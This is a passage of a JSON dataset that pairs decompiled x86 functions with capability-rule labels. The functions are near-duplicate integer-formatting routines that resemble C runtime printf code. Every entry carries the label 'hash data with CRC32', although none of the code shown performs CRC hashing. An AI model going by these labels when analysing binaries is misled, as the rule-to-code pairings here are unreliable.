& 1) != 0) && ((*(in_ECX + 0x34) == 0 || (**(in_ECX + 0x30) != '0')))) {\n            *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n            **(in_ECX + 0x30) = 0x30;\n            *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 1052
    },
    "00442580": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00442580(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t *puVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    int32_t in_ECX;\n    uint32_t arg_8h_00;\n    bool bVar7;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar4 = fcn.0045027c(*(in_ECX + 0x28));\n    if (iVar4 == 1) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar3 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar3 + 4;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar3;\n        }\n        else {\n            arg_8h_00 = *puVar3;\n        }\n    }\n    else if (iVar4 == 2) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 2;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar2;\n        }\n        else {\n            arg_8h_00 = *puVar2;\n        }\n    }\n    else {\n        if (iVar4 != 4) {\n            if (iVar4 != 8) {\n                iVar4 = *(in_ECX + 8);\n                *(iVar4 + 0x1c) = 1;\n                *(iVar4 + 0x18) = 0x16;\n                uVar5 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n                return uVar5 & 0xffffff00;\n            }\n            puVar1 = *(in_ECX + 0x10);\n            uVar5 = *(in_ECX + 0x1c);\n            *(in_ECX + 0x10) = puVar1 + 2;\n            arg_8h_00 = *puVar1;\n            var_8h = puVar1[1];\n            goto code_r0x00442661;\n        }\n        uVar5 = *(in_ECX + 0x1c);\n        if ((uVar5 >> 4 & 1) == 0) {\n            puVar1 = *(in_ECX + 0x10);\n            var_8h = 0;\n            *(in_ECX + 0x10) = puVar1 + 1;\n            arg_8h_00 = *puVar1;\n            goto code_r0x00442661;\n        }\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        arg_8h_00 = *puVar1;\n    }\n    var_8h = arg_8h_00 >> 0x1f;\ncode_r0x00442661:\n    if ((((uVar5 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n        bVar7 = arg_8h_00 != 0;\n        arg_8h_00 = -arg_8h_00;\n        var_8h = -(var_8h + bVar7);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x1c) = uVar5;\n    }\n    if (*(in_ECX + 0x24) < 0) {\n        *(in_ECX + 0x24) = 1;\n    }\n    else {\n        *(in_ECX + 0x1c) = uVar5 & 0xfffffff7;\n        fcn.0043d5b0(*(in_ECX + 0x24), *(in_ECX + 8));\n    }\n    if ((arg_8h_00 | var_8h) == 0) {\n        *(in_ECX + 0x1c) = *(in_ECX + 0x1c) & 0xffffffdf;\n    }\n    *(in_ECX + 0x38) = 0;\n    if (iVar4 == 8) {\n        fcn.00445ec6(arg_8h_00, var_8h, arg_8h);\n    }\n    else {\n        fcn.00444b30(arg_8h_00, arg_8h);\n    }\n    pcVar6 = *(in_ECX + 0x1c) >> 7;\n    if (((pcVar6 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (pcVar6 = *(in_ECX + 0x30),  *pcVar6 != '0')))) {\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        **(in_ECX + 0x30) = 0x30;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    }\n    return CONCAT31(pcVar6 >> 8, 1);\n}\n",
        "token_count": 1242
    },
    "0044270d": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0044270d(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t *puVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int16_t *piVar6;\n    int32_t in_ECX;\n    uint32_t arg_8h_00;\n    bool bVar7;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar4 = fcn.0045027c(*(in_ECX + 0x28));\n    if (iVar4 == 1) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar3 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar3 + 4;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar3;\n        }\n        else {\n            arg_8h_00 = *puVar3;\n        }\n    }\n    else if (iVar4 == 2) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 2;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar2;\n        }\n        else {\n            arg_8h_00 = *puVar2;\n        }\n    }\n    else {\n        if (iVar4 != 4) {\n            if (iVar4 != 8) {\n                iVar4 = *(in_ECX + 8);\n                *(iVar4 + 0x1c) = 1;\n                *(iVar4 + 0x18) = 0x16;\n                uVar5 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n                return uVar5 & 0xffffff00;\n            }\n            puVar1 = *(in_ECX + 0x10);\n            uVar5 = *(in_ECX + 0x1c);\n            *(in_ECX + 0x10) = puVar1 + 2;\n            arg_8h_00 = *puVar1;\n            var_8h = puVar1[1];\n            goto code_r0x004427ee;\n        }\n        uVar5 = *(in_ECX + 0x1c);\n        if ((uVar5 >> 4 & 1) == 0) {\n            puVar1 = *(in_ECX + 0x10);\n            var_8h = 0;\n            *(in_ECX + 0x10) = puVar1 + 1;\n            arg_8h_00 = *puVar1;\n            goto code_r0x004427ee;\n        }\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        arg_8h_00 = *puVar1;\n    }\n    var_8h = arg_8h_00 >> 0x1f;\ncode_r0x004427ee:\n    if ((((uVar5 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n        bVar7 = arg_8h_00 != 0;\n        arg_8h_00 = -arg_8h_00;\n        var_8h = -(var_8h + bVar7);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x1c) = uVar5;\n    }\n    if (*(in_ECX + 0x24) < 0) {\n        *(in_ECX + 0x24) = 1;\n    }\n    else {\n        *(in_ECX + 0x1c) = uVar5 & 0xfffffff7;\n        fcn.0043d631(*(in_ECX + 0x24), *(in_ECX + 8));\n    }\n    if ((arg_8h_00 | var_8h) == 0) {\n        *(in_ECX + 0x1c) = *(in_ECX + 0x1c) & 0xffffffdf;\n    }\n    *(in_ECX + 0x38) = 1;\n    if (iVar4 == 8) {\n        fcn.00445f6d(arg_8h_00, var_8h, arg_8h);\n    }\n    else {\n        fcn.00444bb7(arg_8h_00, arg_8h);\n    }\n    piVar6 = *(in_ECX + 0x1c) >> 7;\n    if (((piVar6 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (piVar6 = *(in_ECX + 0x30),  *piVar6 != 0x30)))) {\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        **(in_ECX + 0x30) = 0x30;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    }\n    return CONCAT31(piVar6 >> 8, 1);\n}\n",
        "token_count": 1245
    },
    "0044289f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0044289f(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t arg_8h_00;\n    uint32_t *puVar4;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    iVar2 = fcn.0045027c(*(in_ECX + 0x28));\n    var_8h = 0;\n    var_4h = 0;\n    if (iVar2 == 1) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043da8f(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043d7d1(&var_8h);\n        }\n    }\n    else if (iVar2 == 2) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043e15d(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043dd4d(&var_8h);\n        }\n    }\n    else if (iVar2 == 4) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043e6cb(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043e40f(&var_8h);\n        }\n    }\n    else {\n        if (iVar2 != 8) {\n            iVar2 = *(in_ECX + 8);\n            *(iVar2 + 0x1c) = 1;\n            *(iVar2 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043f867(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043f579(&var_8h);\n        }\n    }\n    puVar4 = in_ECX + 0x1c;\n    if (cVar1 == '\\0') {\n        return 0;\n    }\n    cVar1 = fcn.0044ac3e();\n    if (cVar1 != '\\0') {\n        uVar3 = *puVar4;\n        arg_8h_00 = var_8h;\n        if ((((uVar3 >> 4 & 1) != 0) && (var_4h < 1)) && (var_4h < 0)) {\n            var_4h = -(var_4h + (var_8h != 0));\n            uVar3 = uVar3 | 0x40;\n            *puVar4 = uVar3;\n            arg_8h_00 = -var_8h;\n        }\n        if (*(in_ECX + 0x24) < 0) {\n            *(in_ECX + 0x24) = 1;\n        }\n        else {\n            *puVar4 = uVar3 & 0xfffffff7;\n            fcn.0043d631(*(in_ECX + 0x24), *(in_ECX + 8));\n        }\n        if ((arg_8h_00 | var_4h) == 0) {\n            *puVar4 = *puVar4 & 0xffffffdf;\n        }\n        *(in_ECX + 0x38) = 1;\n        if (iVar2 == 8) {\n            fcn.0044602a(arg_8h_00, var_4h, arg_8h);\n        }\n        else {\n            fcn.00444c53(arg_8h_00, arg_8h);\n        }\n        if (((*puVar4 >> 7 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (**(in_ECX + 0x30) != 0x30)))) {\n            *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n            **(in_ECX + 0x30) = 0x30;\n            *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 1055
    },
    "00442a3f": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00442a3f(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t *puVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int16_t *piVar6;\n    int32_t in_ECX;\n    uint32_t arg_8h_00;\n    bool bVar7;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar4 = fcn.0045027c(*(in_ECX + 0x28));\n    if (iVar4 == 1) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar3 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar3 + 4;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar3;\n        }\n        else {\n            arg_8h_00 = *puVar3;\n        }\n    }\n    else if (iVar4 == 2) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 2;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar2;\n        }\n        else {\n            arg_8h_00 = *puVar2;\n        }\n    }\n    else {\n        if (iVar4 != 4) {\n            if (iVar4 != 8) {\n                iVar4 = *(in_ECX + 8);\n                *(iVar4 + 0x1c) = 1;\n                *(iVar4 + 0x18) = 0x16;\n                uVar5 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n                return uVar5 & 0xffffff00;\n            }\n            puVar1 = *(in_ECX + 0x10);\n            uVar5 = *(in_ECX + 0x1c);\n            *(in_ECX + 0x10) = puVar1 + 2;\n            arg_8h_00 = *puVar1;\n            var_8h = puVar1[1];\n            goto code_r0x00442b20;\n        }\n        uVar5 = *(in_ECX + 0x1c);\n        if ((uVar5 >> 4 & 1) == 0) {\n            puVar1 = *(in_ECX + 0x10);\n            var_8h = 0;\n            *(in_ECX + 0x10) = puVar1 + 1;\n            arg_8h_00 = *puVar1;\n            goto code_r0x00442b20;\n        }\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        arg_8h_00 = *puVar1;\n    }\n    var_8h = arg_8h_00 >> 0x1f;\ncode_r0x00442b20:\n    if ((((uVar5 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n        bVar7 = arg_8h_00 != 0;\n        arg_8h_00 = -arg_8h_00;\n        var_8h = -(var_8h + bVar7);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x1c) = uVar5;\n    }\n    if (*(in_ECX + 0x24) < 0) {\n        *(in_ECX + 0x24) = 1;\n    }\n    else {\n        *(in_ECX + 0x1c) = uVar5 & 0xfffffff7;\n        fcn.0043d631(*(in_ECX + 0x24), *(in_ECX + 8));\n    }\n    if ((arg_8h_00 | var_8h) == 0) {\n        *(in_ECX + 0x1c) = *(in_ECX + 0x1c) & 0xffffffdf;\n    }\n    *(in_ECX + 0x38) = 1;\n    if (iVar4 == 8) {\n        fcn.004460e7(arg_8h_00, var_8h, arg_8h);\n    }\n    else {\n        fcn.00444cef(arg_8h_00, arg_8h);\n    }\n    piVar6 = *(in_ECX + 0x1c) >> 7;\n    if (((piVar6 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (piVar6 = *(in_ECX + 0x30),  *piVar6 != 0x30)))) {\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        **(in_ECX + 0x30) = 0x30;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    }\n    return CONCAT31(piVar6 >> 8, 1);\n}\n",
        "token_count": 1247
    },
    "00442bd1": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00442bd1(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t *puVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int16_t *piVar6;\n    int32_t in_ECX;\n    uint32_t arg_8h_00;\n    bool bVar7;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar4 = fcn.0045027c(*(in_ECX + 0x28));\n    if (iVar4 == 1) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar3 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar3 + 4;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar3;\n        }\n        else {\n            arg_8h_00 = *puVar3;\n        }\n    }\n    else if (iVar4 == 2) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 2;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar2;\n        }\n        else {\n            arg_8h_00 = *puVar2;\n        }\n    }\n    else {\n        if (iVar4 != 4) {\n            if (iVar4 != 8) {\n                iVar4 = *(in_ECX + 8);\n                *(iVar4 + 0x1c) = 1;\n                *(iVar4 + 0x18) = 0x16;\n                uVar5 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n                return uVar5 & 0xffffff00;\n            }\n            puVar1 = *(in_ECX + 0x10);\n            uVar5 = *(in_ECX + 0x1c);\n            *(in_ECX + 0x10) = puVar1 + 2;\n            arg_8h_00 = *puVar1;\n            var_8h = puVar1[1];\n            goto code_r0x00442cb2;\n        }\n        uVar5 = *(in_ECX + 0x1c);\n        if ((uVar5 >> 4 & 1) == 0) {\n            puVar1 = *(in_ECX + 0x10);\n            var_8h = 0;\n            *(in_ECX + 0x10) = puVar1 + 1;\n            arg_8h_00 = *puVar1;\n            goto code_r0x00442cb2;\n        }\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        arg_8h_00 = *puVar1;\n    }\n    var_8h = arg_8h_00 >> 0x1f;\ncode_r0x00442cb2:\n    if ((((uVar5 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n        bVar7 = arg_8h_00 != 0;\n        arg_8h_00 = -arg_8h_00;\n        var_8h = -(var_8h + bVar7);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x1c) = uVar5;\n    }\n    if (*(in_ECX + 0x24) < 0) {\n        *(in_ECX + 0x24) = 1;\n    }\n    else {\n        *(in_ECX + 0x1c) = uVar5 & 0xfffffff7;\n        fcn.0043d631(*(in_ECX + 0x24), *(in_ECX + 8));\n    }\n    if ((arg_8h_00 | var_8h) == 0) {\n        *(in_ECX + 0x1c) = *(in_ECX + 0x1c) & 0xffffffdf;\n    }\n    *(in_ECX + 0x38) = 1;\n    if (iVar4 == 8) {\n        fcn.004461a4(arg_8h_00, var_8h, arg_8h);\n    }\n    else {\n        fcn.00444d8b(arg_8h_00, arg_8h);\n    }\n    piVar6 = *(in_ECX + 0x1c) >> 7;\n    if (((piVar6 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (piVar6 = *(in_ECX + 0x30),  *piVar6 != 0x30)))) {\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        **(in_ECX + 0x30) = 0x30;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    }\n    return CONCAT31(piVar6 >> 8, 1);\n}\n",
        "token_count": 1248
    },
    "00442d63": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00442d63(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t arg_8h_00;\n    uint32_t *puVar4;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    iVar2 = fcn.0045027c(*(in_ECX + 0x28));\n    var_8h = 0;\n    var_4h = 0;\n    if (iVar2 == 1) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043db1f(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043d861(&var_8h);\n        }\n    }\n    else if (iVar2 == 2) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043e1ed(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043dddd(&var_8h);\n        }\n    }\n    else if (iVar2 == 4) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043e762(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043e499(&var_8h);\n        }\n    }\n    else {\n        if (iVar2 != 8) {\n            iVar2 = *(in_ECX + 8);\n            *(iVar2 + 0x1c) = 1;\n            *(iVar2 + 0x18) = 0x16;\n            fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n            return 0;\n        }\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043f902(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043f614(&var_8h);\n        }\n    }\n    puVar4 = in_ECX + 0x1c;\n    if (cVar1 == '\\0') {\n        return 0;\n    }\n    cVar1 = fcn.0044ac54();\n    if (cVar1 != '\\0') {\n        uVar3 = *puVar4;\n        arg_8h_00 = var_8h;\n        if ((((uVar3 >> 4 & 1) != 0) && (var_4h < 1)) && (var_4h < 0)) {\n            var_4h = -(var_4h + (var_8h != 0));\n            uVar3 = uVar3 | 0x40;\n            *puVar4 = uVar3;\n            arg_8h_00 = -var_8h;\n        }\n        if (*(in_ECX + 0x24) < 0) {\n            *(in_ECX + 0x24) = 1;\n        }\n        else {\n            *puVar4 = uVar3 & 0xfffffff7;\n            fcn.0043d631(*(in_ECX + 0x24), *(in_ECX + 8));\n        }\n        if ((arg_8h_00 | var_4h) == 0) {\n            *puVar4 = *puVar4 & 0xffffffdf;\n        }\n        *(in_ECX + 0x38) = 1;\n        if (iVar2 == 8) {\n            fcn.00446261(arg_8h_00, var_4h, arg_8h);\n        }\n        else {\n            fcn.00444e27(arg_8h_00, arg_8h);\n        }\n        if (((*puVar4 >> 7 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (**(in_ECX + 0x30) != 0x30)))) {\n            *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n            **(in_ECX + 0x30) = 0x30;\n            *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 1047
    },
    "00442f03": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00442f03(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t *puVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int16_t *piVar6;\n    int32_t in_ECX;\n    uint32_t arg_8h_00;\n    bool bVar7;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar4 = fcn.0045027c(*(in_ECX + 0x28));\n    if (iVar4 == 1) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar3 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar3 + 4;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar3;\n        }\n        else {\n            arg_8h_00 = *puVar3;\n        }\n    }\n    else if (iVar4 == 2) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 2;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar2;\n        }\n        else {\n            arg_8h_00 = *puVar2;\n        }\n    }\n    else {\n        if (iVar4 != 4) {\n            if (iVar4 != 8) {\n                iVar4 = *(in_ECX + 8);\n                *(iVar4 + 0x1c) = 1;\n                *(iVar4 + 0x18) = 0x16;\n                uVar5 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n                return uVar5 & 0xffffff00;\n            }\n            puVar1 = *(in_ECX + 0x10);\n            uVar5 = *(in_ECX + 0x1c);\n            *(in_ECX + 0x10) = puVar1 + 2;\n            arg_8h_00 = *puVar1;\n            var_8h = puVar1[1];\n            goto code_r0x00442fe4;\n        }\n        uVar5 = *(in_ECX + 0x1c);\n        if ((uVar5 >> 4 & 1) == 0) {\n            puVar1 = *(in_ECX + 0x10);\n            var_8h = 0;\n            *(in_ECX + 0x10) = puVar1 + 1;\n            arg_8h_00 = *puVar1;\n            goto code_r0x00442fe4;\n        }\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        arg_8h_00 = *puVar1;\n    }\n    var_8h = arg_8h_00 >> 0x1f;\ncode_r0x00442fe4:\n    if ((((uVar5 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n        bVar7 = arg_8h_00 != 0;\n        arg_8h_00 = -arg_8h_00;\n        var_8h = -(var_8h + bVar7);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x1c) = uVar5;\n    }\n    if (*(in_ECX + 0x24) < 0) {\n        *(in_ECX + 0x24) = 1;\n    }\n    else {\n        *(in_ECX + 0x1c) = uVar5 & 0xfffffff7;\n        fcn.0043d631(*(in_ECX + 0x24), *(in_ECX + 8));\n    }\n    if ((arg_8h_00 | var_8h) == 0) {\n        *(in_ECX + 0x1c) = *(in_ECX + 0x1c) & 0xffffffdf;\n    }\n    *(in_ECX + 0x38) = 1;\n    if (iVar4 == 8) {\n        fcn.0044631e(arg_8h_00, var_8h, arg_8h);\n    }\n    else {\n        fcn.00444ec3(arg_8h_00, arg_8h);\n    }\n    piVar6 = *(in_ECX + 0x1c) >> 7;\n    if (((piVar6 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (piVar6 = *(in_ECX + 0x30),  *piVar6 != 0x30)))) {\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -2;\n        **(in_ECX + 0x30) = 0x30;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    }\n    return CONCAT31(piVar6 >> 8, 1);\n}\n",
        "token_count": 1247
    },
    "00443095": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00443095(uint arg_8h)\n\n{\n    uint32_t *puVar1;\n    uint16_t *puVar2;\n    uint8_t *puVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    int32_t in_ECX;\n    uint32_t arg_8h_00;\n    bool bVar7;\n    uint var_ch;\n    uint32_t var_8h;\n    uint var_4h;\n    \n    iVar4 = fcn.0045027c(*(in_ECX + 0x28));\n    if (iVar4 == 1) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar3 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar3 + 4;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar3;\n        }\n        else {\n            arg_8h_00 = *puVar3;\n        }\n    }\n    else if (iVar4 == 2) {\n        uVar5 = *(in_ECX + 0x1c);\n        puVar2 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar2 + 2;\n        if ((uVar5 >> 4 & 1) == 0) {\n            arg_8h_00 = *puVar2;\n        }\n        else {\n            arg_8h_00 = *puVar2;\n        }\n    }\n    else {\n        if (iVar4 != 4) {\n            if (iVar4 != 8) {\n                iVar4 = *(in_ECX + 8);\n                *(iVar4 + 0x1c) = 1;\n                *(iVar4 + 0x18) = 0x16;\n                uVar5 = fcn.0043bac1(0, 0, 0, 0, 0, *(in_ECX + 8));\n                return uVar5 & 0xffffff00;\n            }\n            puVar1 = *(in_ECX + 0x10);\n            uVar5 = *(in_ECX + 0x1c);\n            *(in_ECX + 0x10) = puVar1 + 2;\n            arg_8h_00 = *puVar1;\n            var_8h = puVar1[1];\n            goto code_r0x00443176;\n        }\n        uVar5 = *(in_ECX + 0x1c);\n        if ((uVar5 >> 4 & 1) == 0) {\n            puVar1 = *(in_ECX + 0x10);\n            var_8h = 0;\n            *(in_ECX + 0x10) = puVar1 + 1;\n            arg_8h_00 = *puVar1;\n            goto code_r0x00443176;\n        }\n        puVar1 = *(in_ECX + 0x10);\n        *(in_ECX + 0x10) = puVar1 + 1;\n        arg_8h_00 = *puVar1;\n    }\n    var_8h = arg_8h_00 >> 0x1f;\ncode_r0x00443176:\n    if ((((uVar5 >> 4 & 1) != 0) && (var_8h < 1)) && (var_8h < 0)) {\n        bVar7 = arg_8h_00 != 0;\n        arg_8h_00 = -arg_8h_00;\n        var_8h = -(var_8h + bVar7);\n        uVar5 = uVar5 | 0x40;\n        *(in_ECX + 0x1c) = uVar5;\n    }\n    if (*(in_ECX + 0x24) < 0) {\n        *(in_ECX + 0x24) = 1;\n    }\n    else {\n        *(in_ECX + 0x1c) = uVar5 & 0xfffffff7;\n        fcn.0043d5b0(*(in_ECX + 0x24), *(in_ECX + 8));\n    }\n    if ((arg_8h_00 | var_8h) == 0) {\n        *(in_ECX + 0x1c) = *(in_ECX + 0x1c) & 0xffffffdf;\n    }\n    *(in_ECX + 0x38) = 0;\n    if (iVar4 == 8) {\n        fcn.004463db(arg_8h_00, var_8h, arg_8h);\n    }\n    else {\n        fcn.00444f5f(arg_8h_00, arg_8h);\n    }\n    pcVar6 = *(in_ECX + 0x1c) >> 7;\n    if (((pcVar6 & 1) != 0) && ((*(in_ECX + 0x34) == 0 || (pcVar6 = *(in_ECX + 0x30),  *pcVar6 != '0')))) {\n        *(in_ECX + 0x30) = *(in_ECX + 0x30) + -1;\n        **(in_ECX + 0x30) = 0x30;\n        *(in_ECX + 0x34) = *(in_ECX + 0x34) + 1;\n    }\n    return CONCAT31(pcVar6 >> 8, 1);\n}\n",
        "token_count": 1242
    },
    "00443222": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00443222(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint32_t uVar3;\n    uint32_t arg_8h_00;\n    uint32_t *puVar4;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    iVar2 = fcn.0045027c(*(in_ECX + 0x28));\n    var_8h = 0;\n    var_4h = 0;\n    if (iVar2 == 1) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043d971(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043d6b3(&var_8h);\n        }\n    }\n    else if (iVar2 == 2) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043e03f(&var_8h);\n        }\n        else {\n            cVar1 = fcn.0043dc2f(&var_8h);\n        }\n    }\n    else if (iVar2 == 4) {\n        if ((*(in_ECX + 0x1c) >> 4 & 1) == 0) {\n            cVar1 = fcn.0043e59f(&var_8h);\n    